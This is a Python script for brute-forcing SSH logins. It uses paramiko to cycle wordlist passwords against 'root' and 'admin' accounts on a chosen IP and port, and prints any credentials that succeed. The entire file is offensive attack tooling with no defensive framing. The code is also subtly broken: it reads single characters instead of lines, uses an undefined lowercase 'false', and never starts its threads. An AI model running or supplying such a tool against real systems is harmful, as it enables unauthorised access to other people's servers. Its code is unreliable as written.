import time
import threading
import sys
import getopt
import socket
import paramiko

class SSHBF:
    _username_list = ['root', 'admin']
    _ip = ''
    _password_list =  []
   
    def __init__(self, wordlist, ip, port = 22):
        self._ip = ip
        self._port =  port
        with open(wordlist, 'r')  as password_file:
            for line in password_file.readline():
                password = line.strip('\n')
                self._password_list.append(password)
    
    def connect(self,user, password, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            #Connect to SSH using username,password
            ssh.connect(self._ip, self._port, user,password,banner_timeout=30, allow_agent=False, look_for_keys=false)
        except paramiko.AuthenticationException:
            code  = 1
        except paramiko.SSHException:
            code = 2
        except socket.error as e:
            code = 3
        ssh.close()
        return code
    
    def scan(self):
        for user in self._username_list:
            t1 = threading.Thread(target=self.main, args=(user,))

    def main(self, user):
        try:
            for password in self._password_list:
                code = self.connect(user, password)
                if code == 0:
                    print(f'Connected with User:  {user} and Password: {password}')
                    break
                elif code == 3:
                    print('Connection could not be established.  Check your IP and port. Terminating')
                    break
        except Exception as e:
            print(e)      


def main(argv):
    ip = ''
    wordlist = ''
    port = 22
    try:
        opts, args = getopt.getopt(argv,"hi:w:p:", ["wordlist=", "ip=" , "port="] )
    except getopt.GetoptError:
        print('sshbf.py -i <ip>  -w <wordlist> -p = <port>')
        sys.exit(2)
    try:
        for opt, arg in opts:
            if opt == '-h':
                print('sshbf.py -i <ip>  -w <wordlist> -p = <port>')
                sys.exit()
            elif opt in ("-i", "--ip"):
                ip = arg
            elif opt in ("-p", "--port"):
                port = arg
            elif opt in ("-w", "--wordlist"):
                wordlist = arg
        sshbf = SSHBF(wordlist, ip, port)
        sshbf.scan()
   
    except Exception as err:
        print(err)
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])